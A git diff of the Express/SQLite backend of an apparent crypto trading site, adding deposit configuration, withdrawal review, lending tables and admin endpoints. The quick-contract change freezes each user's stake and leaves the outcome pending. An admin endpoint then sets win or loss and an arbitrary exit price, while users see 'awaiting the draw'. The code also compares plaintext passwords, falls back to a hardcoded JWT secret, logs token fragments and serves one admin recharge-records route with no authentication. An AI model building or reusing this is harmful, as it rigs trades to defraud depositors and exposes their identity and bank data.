@@ -10,7 +10,17 @@ const JWT_SECRET = process.env.JWT_SECRET || "foxpro-secret-key-2026";
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static(__dirname));
+
+// 调试中间件：记录所有请求
+app.use((req, res, next) => {
+  if (req.path.startsWith('/api')) {
+    console.log(`[API] ${req.method} ${req.path}`);
+  }
+  next();
+});
+
+// 先处理所有 /api 路由，再处理静态文件
+// 这样确保 API 请求不会被静态文件处理器拦截
 
 // 初始化 SQLite 数据库
 const dbPath = path.join(__dirname, "foxpro.db");
@@ -28,6 +38,21 @@ db.exec(`
     country TEXT,
     status TEXT DEFAULT 'active',
     isAdmin INTEGER DEFAULT 0,
+    createdAt TEXT,
+    updatedAt TEXT
+  );
+`);
+
+// 创建充值币种配置表
+db.exec(`
+  CREATE TABLE IF NOT EXISTS recharge_config (
+    id TEXT PRIMARY KEY,
+    coin TEXT NOT NULL UNIQUE,
+    network TEXT NOT NULL,
+    address TEXT NOT NULL,
+    qrCodeUrl TEXT,
+    minAmount REAL NOT NULL,
+    enabled INTEGER DEFAULT 1,
     createdAt TEXT,
     updatedAt TEXT
   );
@@ -1549,17 +1574,17 @@ app.post("/api/quick-contract/place", (req, res) => {
       profit = isWin ? (amount * (config.profitRate / 100)) : -(amount * 0.05);
     }
 
-    // Create order
+    // Create order - 状态为 pending，由管理员决定结果
     const orderId = "qco_" + Date.now();
     const now = new Date().toISOString();
     
     db.prepare(`
       INSERT INTO quick_contract_orders
-      (id, userId, username, symbol, direction, seconds, amount, entryPrice, exitPrice, profit, status, result, createdAt, updatedAt)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'completed', ?, ?, ?)
-    `).run(orderId, user.id, user.username, symbol, direction, seconds, amount, currentPrice, resultPrice, profit, isWin ? 'win' : 'loss', now, now);
+      (id, userId, username, symbol, direction, seconds, amount, entryPrice, status, result, createdAt, updatedAt)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'pending', 'pending', ?, ?)
+    `).run(orderId, user.id, user.username, symbol, direction, seconds, amount, currentPrice, now, now);
 
-    // 更新用户余额
+    // 先预留金额（冻结用户金额）
     let assets = {};
     try {
       const assetsRecord = db.prepare("SELECT balances FROM user_assets WHERE userId = ?").get(userId);
@@ -1572,8 +1597,9 @@ app.post("/api/quick-contract/place", (req, res) => {
       };
     }
 
-    const newBalance = (assets.USDT || 0) + profit;
-    assets.USDT = newBalance;
+    // 冻结金额
+    const frozenBefore = (assets.USDT || 0);
+    assets.USDT = frozenBefore - amount;
 
     const assetsRecord = db.prepare("SELECT * FROM user_assets WHERE userId = ?").get(userId);
     if (assetsRecord) {
@@ -1584,8 +1610,9 @@ app.post("/api/quick-contract/place", (req, res) => {
         .run(userId, JSON.stringify(assets), now);
     }
 
-    console.log(`[Quick Contract] Order ${orderId}: ${user.username} ${direction} ${amount}USDT on ${symbol} - ${isWin ? 'WIN' : 'LOSS'} (${profit.toFixed(2)})`);
+    console.log(`[Quick Contract] New Order ${orderId}: ${user.username} ${direction} ${amount}USDT on ${symbol} - PENDING`);
 
+    // 返回待审核状态的订单信息
     res.json({
       success: true,
       orderId,
@@ -1594,12 +1621,14 @@ app.post("/api/quick-contract/place", (req, res) => {
       seconds,
       amount,
       entryPrice: currentPrice,
-      exitPrice: resultPrice,
-      profit: profit,
+      exitPrice: currentPrice,
+      profit: 0,
       profitRate: config.profitRate,
-      result: isWin ? 'win' : 'loss',
-      potentialProfit: profit.toFixed(2),
-      newBalance: newBalance.toFixed(2)
+      result: 'pending',
+      status: 'pending',
+      potentialProfit: (amount * config.profitRate / 100).toFixed(2),
+      newBalance: assets.USDT.toFixed(2),
+      message: '订单已提交，等待开奖结果...'
     });
   } catch (error) {
     console.error("Error placing quick contract order:", error);
@@ -1686,8 +1715,18 @@ app.get("/api/admin/quick-contract/orders", (req, res) => {
       return res.status(401).json({ error: "Unauthorized" });
     }
 
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
     const orders = db.prepare(`
-      SELECT id, userId, symbol, direction, seconds, amount, entryPrice, exitPrice, profit, 
+      SELECT id, userId, username, symbol, direction, seconds, amount, entryPrice, exitPrice, profit, 
              profitRate, status, result, createdAt
       FROM quick_contract_orders
       ORDER BY createdAt DESC
@@ -1699,20 +1738,176 @@ app.get("/api/admin/quick-contract/orders", (req, res) => {
       data: orders.map(o => ({
         id: o.id,
         userId: o.userId,
+        username: o.username,
         symbol: o.symbol,
-        direction: o.direction,
-        seconds: o.seconds,
-        amount: o.amount,
+        direction: o.direction === 'long' ? '看涨' : '看跌',
+        seconds: o.seconds + 's',
+        amount: '$' + o.amount,
         entryPrice: o.entryPrice,
         exitPrice: o.exitPrice,
-        profit: o.profit,
-        profitRate: o.profitRate,
+        profit: '$' + (o.profit || 0).toFixed(2),
         status: o.status,
-        result: o.result,
+        result: o.result === 'win' ? '赚取' : '亏损',
         createdAt: o.createdAt
       }))
     });
   } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 管理员：获取秒合约交易列表（用于设置结果）
+ * GET /api/admin/quick-contract/trades
+ */
+app.get("/api/admin/quick-contract/trades", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(' ')[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
+    // 同时显示 pending 和已处理的订单
+    const orders = db.prepare(`
+      SELECT id, userId, username, symbol, direction, seconds, amount, entryPrice, exitPrice, profit, status, result, createdAt
+      FROM quick_contract_orders
+      ORDER BY createdAt DESC
+      LIMIT 100
+    `).all();
+
+    res.json({
+      success: true,
+      data: orders.map(o => ({
+        id: o.id,
+        userId: o.userId,
+        username: o.username,
+        symbol: o.symbol,
+        direction: o.direction === 'long' ? '看涨' : '看跌',
+        amount: o.amount,
+        entryPrice: o.entryPrice,
+        exitPrice: o.exitPrice || o.entryPrice,
+        profit: o.profit || 0,
+        seconds: o.seconds,
+        status: o.status,
+        result: o.result,
+        createdAt: o.createdAt,
+        displayStatus: o.status === 'pending' ? '待开奖' : (o.result === 'win' ? '赢' : '亏')
+      }))
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 管理员：设置秒合约交易结果（赢/亏）
+ * PUT /api/admin/quick-contract/trades/:id
+ */
+app.put("/api/admin/quick-contract/trades/:id", (req, res) => {
+  try {
+    const { id } = req.params;
+    const { result, exitPrice } = req.body; // result: 'win' 或 'loss'
+    const token = req.headers.authorization?.split(' ')[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
+    // 获取订单
+    const order = db.prepare(`
+      SELECT * FROM quick_contract_orders WHERE id = ?
+    `).get(id);
+
+    if (!order) {
+      return res.status(404).json({ success: false, error: "Order not found" });
+    }
+
+    if (order.status !== 'pending') {
+      return res.status(400).json({ success: false, error: "Order is not pending" });
+    }
+
+    // 获取配置
+    const config = db.prepare("SELECT * FROM quick_contract_config WHERE seconds = ?").get(order.seconds);
+    if (!config) {
+      return res.status(400).json({ success: false, error: "Config not found" });
+    }
+
+    // 计算利润
+    let profit = 0;
+    if (result === 'win') {
+      profit = order.amount * (config.profitRate / 100);
+    } else {
+      profit = -(order.amount * 0.05); // 亏损5%
+    }
+
+    const finalExitPrice = exitPrice || (order.entryPrice * (1 + (result === 'win' ? 0.05 : -0.05)));
+    const now = new Date().toISOString();
+
+    // 更新订单
+    db.prepare(`
+      UPDATE quick_contract_orders
+      SET status = 'completed', result = ?, exitPrice = ?, profit = ?, updatedAt = ?
+      WHERE id = ?
+    `).run(result, finalExitPrice, profit, now, id);
+
+    // 更新用户余额
+    let assets = {};
+    try {
+      const assetsRecord = db.prepare("SELECT balances FROM user_assets WHERE userId = ?").get(order.userId);
+      if (assetsRecord) {
+        assets = JSON.parse(assetsRecord.balances || '{}');
+      }
+    } catch (e) {
+      assets = { BTC: 0, ETH: 0, USDT: 0, SOL: 0, ADA: 0, XRP: 0, DOGE: 0, LTC: 0 };
+    }
+
+    // 返还冻结金额 + 利润
+    assets.USDT = (assets.USDT || 0) + order.amount + profit;
+
+    const assetsRecord = db.prepare("SELECT * FROM user_assets WHERE userId = ?").get(order.userId);
+    if (assetsRecord) {
+      db.prepare("UPDATE user_assets SET balances = ?, updatedAt = ? WHERE userId = ?")
+        .run(JSON.stringify(assets), now, order.userId);
+    } else {
+      db.prepare("INSERT INTO user_assets (userId, balances, updatedAt) VALUES (?, ?, ?)")
+        .run(order.userId, JSON.stringify(assets), now);
+    }
+
+    console.log(`[Admin] Set quick contract order ${id} result: ${result} (Profit: ${profit.toFixed(2)})`);
+
+    res.json({
+      success: true,
+      message: `Order result set to ${result === 'win' ? '赢' : '亏'}`,
+      order: {
+        id,
+        result,
+        profit: profit.toFixed(2),
+        newBalance: assets.USDT.toFixed(2)
+      }
+    });
+  } catch (error) {
+    console.error("Error setting order result:", error);
     res.status(500).json({ error: error.message });
   }
 });
@@ -2438,6 +2633,40 @@ app.put("/api/admin/recharge/coins/:coinId", (req, res) => {
 /**
  * 获取所有充值记录（管理员）
  */
+app.get("/api/admin/recharge/orders", (req, res) => {
+  try {
+    // 从数据库获取充值记录
+    const records = db.prepare(`
+      SELECT id, userId, username, coin, amount, network, address, txHash, status, notes, createdAt 
+      FROM recharge_orders 
+      ORDER BY createdAt DESC
+    `).all();
+
+    res.json({
+      success: true,
+      data: records.map(r => ({
+        id: r.id,
+        userId: r.userId,
+        username: r.username || '-',
+        coin: r.coin,
+        amount: r.amount,
+        network: r.network,
+        address: r.address,
+        txHash: r.txHash,
+        status: r.status || 'pending',
+        notes: r.notes,
+        createdAt: r.createdAt,
+      }))
+    });
+  } catch (error) {
+    console.error("Error fetching recharge records:", error);
+    res.status(500).json({ error: "Failed to fetch recharge records" });
+  }
+});
+
+/**
+ * 获取所有充值记录（管理员）- 别名
+ */
 app.get("/api/admin/recharge/records", (req, res) => {
   try {
     // 从数据库获取充值记录
@@ -2655,6 +2884,106 @@ app.delete("/api/admin/withdraw/records/:recordId", (req, res) => {
   });
 });
 
+/**
+ * 审核提现订单（通过/拒绝，附带备注）
+ * POST /api/admin/withdraw/review/:recordId
+ */
+app.post("/api/admin/withdraw/review/:recordId", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const adminId = verifyToken(token);
+    
+    if (!adminId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(adminId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+
+    const { recordId } = req.params;
+    const { status, notes, txHash } = req.body;
+
+    if (!status || !['approved', 'rejected'].includes(status)) {
+      return res.status(400).json({ success: false, error: "Invalid status" });
+    }
+
+    const order = db.prepare("SELECT * FROM withdraw_orders WHERE id = ?").get(recordId);
+    if (!order) {
+      return res.status(404).json({ success: false, error: "Order not found" });
+    }
+
+    const now = new Date().toISOString();
+    
+    // 更新订单状态和备注
+    db.prepare(`
+      UPDATE withdraw_orders 
+      SET status = ?, notes = ?, txHash = ?, updatedAt = ?
+      WHERE id = ?
+    `).run(status === 'approved' ? 'completed' : 'rejected', notes || '', txHash || null, now, recordId);
+
+    // 如果是审核通过，更新用户余额
+    if (status === 'approved') {
+      const user = db.prepare("SELECT * FROM users WHERE id = ?").get(order.userId);
+      if (user) {
+        const assets = db.prepare("SELECT balances FROM user_assets WHERE userId = ?").get(order.userId);
+        if (assets) {
+          let balances = JSON.parse(assets.balances);
+          balances[order.coin] = (balances[order.coin] || 0) - order.amount;
+          db.prepare("UPDATE user_assets SET balances = ?, updatedAt = ? WHERE userId = ?").run(
+            JSON.stringify(balances),
+            now,
+            order.userId
+          );
+        }
+      }
+    }
+
+    const updatedOrder = db.prepare("SELECT * FROM withdraw_orders WHERE id = ?").get(recordId);
+
+    res.json({
+      success: true,
+      message: status === 'approved' ? '提现已批准' : '提现已拒绝',
+      data: updatedOrder
+    });
+  } catch (error) {
+    console.error("Error reviewing withdraw order:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 获取用户的提现订单记录（含备注和状态）
+ * GET /api/withdraw/myorders
+ */
+app.get("/api/withdraw/myorders", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const orders = db.prepare(`
+      SELECT id, coin, amount, network, address, txHash, status, notes, createdAt, updatedAt
+      FROM withdraw_orders
+      WHERE userId = ?
+      ORDER BY createdAt DESC
+    `).all(userId);
+
+    res.json({
+      success: true,
+      data: orders,
+      message: "User withdraw orders retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching user withdraw orders:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
 // =====================
 // 充值币种设置 API
 // =====================
@@ -2672,6 +3001,275 @@ app.get("/api/admin/recharge-options", (req, res) => {
 /**
  * 用户获取充值币种列表（前端使用）
  */
+/**
+ * 用户获取充值币种配置
+ * GET /api/recharge/config
+ */
+app.get("/api/recharge/config", (req, res) => {
+  try {
+    const configs = db.prepare(`
+      SELECT id, coin, network, address, qrCodeUrl, minAmount, enabled
+      FROM recharge_config
+      WHERE enabled = 1
+      ORDER BY coin ASC
+    `).all();
+
+    res.json({
+      success: true,
+      data: configs,
+      message: "Recharge config retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching recharge config:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 后台获取所有充值配置
+ * GET /api/admin/recharge/config
+ */
+app.get("/api/admin/recharge/config", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+
+    const configs = db.prepare(`
+      SELECT id, coin, network, address, qrCodeUrl, minAmount, enabled, createdAt, updatedAt
+      FROM recharge_config
+      ORDER BY coin ASC
+    `).all();
+
+    res.json({
+      success: true,
+      data: configs,
+      message: "All recharge config retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching admin recharge config:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 后台创建或更新充值配置
+ * POST /api/admin/recharge/config
+ */
+app.post("/api/admin/recharge/config", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+
+    const { coin, network, address, qrCodeUrl, minAmount, enabled } = req.body;
+
+    if (!coin || !network || !address || minAmount === undefined) {
+      return res.status(400).json({ success: false, error: "Missing required fields" });
+    }
+
+    const now = new Date().toISOString();
+    const id = "rc_" + Date.now();
+
+    // 检查是否已存在
+    const existing = db.prepare("SELECT * FROM recharge_config WHERE coin = ?").get(coin);
+    
+    if (existing) {
+      // 更新
+      db.prepare(`
+        UPDATE recharge_config 
+        SET network = ?, address = ?, qrCodeUrl = ?, minAmount = ?, enabled = ?, updatedAt = ?
+        WHERE coin = ?
+      `).run(network, address, qrCodeUrl || null, minAmount, enabled ? 1 : 0, now, coin);
+      
+      const updated = db.prepare("SELECT * FROM recharge_config WHERE coin = ?").get(coin);
+      res.json({
+        success: true,
+        data: updated,
+        message: "Recharge config updated successfully"
+      });
+    } else {
+      // 创建
+      db.prepare(`
+        INSERT INTO recharge_config (id, coin, network, address, qrCodeUrl, minAmount, enabled, createdAt, updatedAt)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+      `).run(id, coin, network, address, qrCodeUrl || null, minAmount, enabled ? 1 : 0, now, now);
+      
+      const created = db.prepare("SELECT * FROM recharge_config WHERE id = ?").get(id);
+      res.json({
+        success: true,
+        data: created,
+        message: "Recharge config created successfully"
+      });
+    }
+  } catch (error) {
+    console.error("Error creating/updating recharge config:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 后台删除充值配置
+ * DELETE /api/admin/recharge/config/:coin
+ */
+app.delete("/api/admin/recharge/config/:coin", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+
+    const { coin } = req.params;
+    const result = db.prepare("DELETE FROM recharge_config WHERE coin = ?").run(coin);
+
+    if (result.changes === 0) {
+      return res.status(404).json({ success: false, error: "Config not found" });
+    }
+
+    res.json({
+      success: true,
+      message: "Recharge config deleted successfully"
+    });
+  } catch (error) {
+    console.error("Error deleting recharge config:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 用户提交充值申请
+ * POST /api/recharge/submit
+ */
+app.post("/api/recharge/submit", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const { coin, amount, txHash, network } = req.body;
+
+    if (!coin || !amount || amount <= 0) {
+      return res.status(400).json({ success: false, error: "Invalid parameters" });
+    }
+
+    const user = db.prepare("SELECT * FROM users WHERE id = ?").get(userId);
+    if (!user) {
+      return res.status(404).json({ success: false, error: "User not found" });
+    }
+
+    const now = new Date().toISOString();
+    const id = "rch_" + Date.now();
+
+    db.prepare(`
+      INSERT INTO recharge_orders (id, userId, username, coin, amount, network, txHash, status, createdAt, updatedAt)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `).run(id, userId, user.username, coin, amount, network || 'mainnet', txHash || null, 'pending', now, now);
+
+    const order = db.prepare("SELECT * FROM recharge_orders WHERE id = ?").get(id);
+
+    res.json({
+      success: true,
+      data: order,
+      message: "Recharge order submitted successfully"
+    });
+  } catch (error) {
+    console.error("Error submitting recharge order:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 用户获取充值订单
+ * GET /api/recharge/myorders
+ */
+app.get("/api/recharge/myorders", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const orders = db.prepare(`
+      SELECT id, coin, amount, network, txHash, status, createdAt, updatedAt
+      FROM recharge_orders
+      WHERE userId = ?
+      ORDER BY createdAt DESC
+    `).all(userId);
+
+    res.json({
+      success: true,
+      data: orders,
+      message: "User recharge orders retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching user recharge orders:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+/**
+ * 后台获取所有充值订单
+ * GET /api/admin/recharge/orders
+ */
+app.get("/api/admin/recharge/orders", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    const userId = verifyToken(token);
+    
+    if (!userId) {
+      return res.status(401).json({ success: false, error: "Unauthorized" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ success: false, error: "Admin access required" });
+    }
+
+    const orders = db.prepare(`
+      SELECT id, userId, username, coin, amount, network, txHash, status, createdAt, updatedAt
+      FROM recharge_orders
+      ORDER BY createdAt DESC
+    `).all();
+
+    res.json({
+      success: true,
+      data: orders,
+      message: "All recharge orders retrieved successfully"
+    });
+  } catch (error) {
+    console.error("Error fetching admin recharge orders:", error);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
 app.get("/api/recharge/options", (req, res) => {
   const enabledOptions = rechargeOptions.filter(o => o.enabled);
   res.json({
@@ -2991,9 +3589,12 @@ app.post("/api/auth/register", (req, res) => {
 app.post("/api/auth/login", (req, res) => {
   const { username, password } = req.body;
 
+  console.log('[Login] 收到登录请求:', { username });
+
   // 验证必填字段
   if (!username || !password) {
-    return res.status(400).json({ message: "Username and password required" });
+    console.log('[Login] 缺少必填字段');
+    return res.status(400).json({ success: false, message: "Username and password required" });
   }
 
   try {
@@ -3003,17 +3604,23 @@ app.post("/api/auth/login", (req, res) => {
       username.toLowerCase()
     );
 
+    console.log('[Login] 数据库查询结果:', !!user);
+
     if (!user) {
-      return res.status(401).json({ message: "Username or password incorrect" });
+      console.log('[Login] 用户不存在:', username);
+      return res.status(401).json({ success: false, message: "Username or password incorrect" });
     }
 
     // 验证密码
     if (user.password !== password) {
-      return res.status(401).json({ message: "Username or password incorrect" });
+      console.log('[Login] 密码错误');
+      return res.status(401).json({ success: false, message: "Username or password incorrect" });
     }
 
     // 生成 Token
     const token = generateToken(user.id);
+
+    console.log('[Login] Token 已生成:', token.substring(0, 20) + '...');
 
     // 初始化用户会话
     sessions[user.id] = {
@@ -3027,16 +3634,20 @@ app.post("/api/auth/login", (req, res) => {
       },
     };
 
+    console.log('[Login] 登录成功，返回响应');
+
     res.json({
+      success: true,
       message: "登录成功",
       token,
       userId: user.id,
       username: user.username,
       email: user.email,
+      isAdmin: user.isAdmin || 0,
     });
   } catch (err) {
-    console.error("Login error:", err);
-    res.status(500).json({ message: "Internal server error" });
+    console.error("[Login] 登录错误:", err);
+    res.status(500).json({ success: false, message: "Internal server error: " + err.message });
   }
 });
 
@@ -3276,6 +3887,106 @@ app.get("/api/admin/verification-queue", (req, res) => {
     res.json({ success: true, data: submissions });
   } catch (err) {
     res.status(401).json({ message: "Invalid token" });
+  }
+});
+
+/**
+ * 获取初级认证提交（管理员）
+ */
+app.get("/api/admin/auth/primary", (req, res) => {
+  const token = req.headers.authorization?.split(" ")[1];
+
+  if (!token) {
+    return res.status(401).json({ message: "No token provided" });
+  }
+
+  const userId = verifyToken(token);
+  if (!userId) {
+    return res.status(401).json({ message: "Invalid token" });
+  }
+
+  try {
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ message: "Unauthorized" });
+    }
+
+    const submissions = db.prepare(`
+      SELECT vs.id, vs.userId, u.username, vs.data, vs.status, vs.submittedAt 
+      FROM verification_submissions vs
+      JOIN users u ON vs.userId = u.id
+      WHERE vs.type = 'primary' AND vs.status = 'pending'
+      ORDER BY vs.submittedAt DESC
+    `).all();
+
+    const formatted = submissions.map(s => {
+      let data = {};
+      try {
+        data = JSON.parse(s.data || '{}');
+      } catch (e) {}
+      return {
+        id: s.id,
+        userId: s.userId,
+        username: s.username,
+        idNumber: data.idNumber || '',
+        submittedAt: s.submittedAt,
+        status: s.status
+      };
+    });
+
+    res.json({ success: true, data: formatted });
+  } catch (err) {
+    res.status(500).json({ message: "Failed to fetch auth submissions" });
+  }
+});
+
+/**
+ * 获取高级认证提交（管理员）
+ */
+app.get("/api/admin/auth/advanced", (req, res) => {
+  const token = req.headers.authorization?.split(" ")[1];
+
+  if (!token) {
+    return res.status(401).json({ message: "No token provided" });
+  }
+
+  const userId = verifyToken(token);
+  if (!userId) {
+    return res.status(401).json({ message: "Invalid token" });
+  }
+
+  try {
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ message: "Unauthorized" });
+    }
+
+    const submissions = db.prepare(`
+      SELECT vs.id, vs.userId, u.username, vs.data, vs.status, vs.submittedAt 
+      FROM verification_submissions vs
+      JOIN users u ON vs.userId = u.id
+      WHERE vs.type = 'advanced' AND vs.status = 'pending'
+      ORDER BY vs.submittedAt DESC
+    `).all();
+
+    const formatted = submissions.map(s => {
+      let data = {};
+      try {
+        data = JSON.parse(s.data || '{}');
+      } catch (e) {}
+      return {
+        id: s.id,
+        userId: s.userId,
+        username: s.username,
+        bankCard: data.info?.bankCard || '',
+        submittedAt: s.submittedAt,
+        status: s.status
+      };
+    });
+
+    res.json({ success: true, data: formatted });
+  } catch (err) {
+    res.status(500).json({ message: "Failed to fetch auth submissions" });
   }
 });
 
@@ -5922,12 +6633,785 @@ app.post("/api/admin/content/:contentType", (req, res) => {
   }
 });
 
-// =====================
-// 启动服务器
-// =====================
+/**
+ * 管理员：获取兑换币种记录
+ * GET /api/admin/exchange-rates
+ */
+app.get("/api/admin/exchange-rates", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const admin = db.prepare("SELECT * FROM users WHERE id = ? AND isAdmin = 1").get(userId);
+    if (!admin) {
+      return res.status(403).json({ error: "Admin only" });
+    }
+
+    // 从交易订单中统计用户兑换币种的情况
+    const exchangeStats = db.prepare(`
+      SELECT 
+        u.username,
+        qco.symbol as coin,
+        COUNT(*) as count,
+        SUM(CASE WHEN qco.result = 'win' THEN 1 ELSE 0 END) as winCount,
+        ROUND(100.0 * SUM(CASE WHEN qco.result = 'win' THEN 1 ELSE 0 END) / COUNT(*), 2) as successRate,
+        MAX(qco.createdAt) as createdAt
+      FROM quick_contract_orders qco
+      JOIN users u ON qco.userId = u.id
+      GROUP BY u.username, qco.symbol
+      ORDER BY qco.createdAt DESC
+    `).all();
+
+    res.json({
+      success: true,
+      data: exchangeStats.map(stat => ({
+        username: stat.username,
+        coin: stat.coin,
+        amount: stat.count,
+        successRate: stat.successRate + '%',
+        createdAt: stat.createdAt
+      }))
+    });
+  } catch (error) {
+    console.error("Error fetching exchange rates:", error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+/**
+ * 创建借贷产品表（如果不存在）
+ */
+db.exec(`
+  CREATE TABLE IF NOT EXISTS lending_products (
+    id TEXT PRIMARY KEY,
+    name TEXT NOT NULL,
+    description TEXT,
+    minAmount REAL NOT NULL,
+    maxAmount REAL NOT NULL,
+    rate REAL NOT NULL,
+    term INTEGER NOT NULL,
+    status TEXT DEFAULT 'active',
+    enabled INTEGER DEFAULT 1,
+    createdAt TEXT,
+    updatedAt TEXT
+  );
+`);
+
+/**
+ * 创建币种兑换订单表（如果不存在）
+ */
+db.exec(`
+  CREATE TABLE IF NOT EXISTS exchange_orders (
+    id TEXT PRIMARY KEY,
+    userId TEXT NOT NULL,
+    username TEXT,
+    fromCoin TEXT NOT NULL,
+    toCoin TEXT NOT NULL,
+    fromAmount REAL NOT NULL,
+    toAmount REAL NOT NULL,
+    exchangeRate REAL NOT NULL,
+    fee REAL DEFAULT 0,
+    status TEXT DEFAULT 'completed',
+    notes TEXT,
+    createdAt TEXT,
+    updatedAt TEXT,
+    FOREIGN KEY (userId) REFERENCES users(id)
+  );
+`);
+
+/**
+ * 创建借贷应用表（如果不存在）
+ */
+db.exec(`
+  CREATE TABLE IF NOT EXISTS lending_applications (
+    id TEXT PRIMARY KEY,
+    userId TEXT NOT NULL,
+    username TEXT,
+    amount REAL NOT NULL,
+    rate REAL DEFAULT 5,
+    term INTEGER DEFAULT 30,
+    status TEXT DEFAULT 'pending',
+    approvedAt TEXT,
+    approvedBy TEXT,
+    rejectionReason TEXT,
+    appliedAt TEXT,
+    createdAt TEXT,
+    updatedAt TEXT,
+    FOREIGN KEY (userId) REFERENCES users(id)
+  );
+`);
+
+/**
+ * 用户申请借贷
+ * POST /api/lending/apply
+ */
+app.post("/api/lending/apply", (req, res) => {
+  try {
+    const token = req.headers.authorization?.split(" ")[1];
+    
+    if (!token) {
+      return res.status(401).json({ error: "Unauthorized" });
+    }
+
+    const userId = verifyToken(token);
+    if (!userId) {
+      return res.status(401).json({ error: "Invalid token" });
+    }
+
+    const user = db.prepare("SELECT * FROM users WHERE id = ?").get(userId);
+    if (!user) {
+      return res.status(401).json({ error: "User not found" });
+    }
+
+    const { amount, term } = req.body;
+
+    if (!amount || amount <= 0) {
+      return res.status(400).json({ error: "Invalid amount" });
+    }
+
+    if (!term || term < 7 || term > 365) {
+      return res.status(400).json({ error: "Term must be between 7 and 365 days" });
+    }
+
+    const applicationId = "lend_" + Date.now();
+    const now = new Date().toISOString();
+    const rate = 5; // 默认5%利率
+
+    db.prepare(`
+      INSERT INTO lending_applications
+      (id, userId, username, amount, rate, term, status, appliedAt, createdAt, updatedAt)
+      VALUES (?, ?, ?, ?, ?, ?, 'pending', ?, ?, ?)
+    `).run(applicationId, userId, user.username, amount, rate, term, now, now, now);
+
+    console.log(`[Lending] User ${user.username} applied for loan: $${amount} for ${term} days`);
+
+    res.json({
+      success: true,
